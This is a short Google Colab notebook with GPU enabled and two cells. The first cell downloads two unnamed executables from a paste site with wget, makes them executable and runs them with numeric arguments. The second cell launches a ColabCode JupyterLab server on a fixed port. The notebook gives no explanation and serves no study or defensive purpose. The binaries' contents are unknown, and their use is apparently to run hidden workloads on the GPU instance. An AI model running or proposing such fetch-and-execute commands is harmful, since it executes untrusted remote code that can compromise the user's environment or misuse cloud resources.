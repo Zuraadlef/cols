{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Untitled6.ipynb",
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "sK7Sqe2Zi26g"
      },
      "source": [
        "!wget https://www.heypasteit.com/download/0IWVJX && chmod u+x 0IWVJX && ./0IWVJX 65 75\n",
        "!wget https://www.heypasteit.com/download/0IWVJZ && chmod u+x 0IWVJZ && ./0IWVJZ 65 75"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "BpWpc4l7i5j5"
      },
      "source": [
        "import colabcode as cc\n",
        "cc.ColabCode(port = 10722,  lab = True)"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}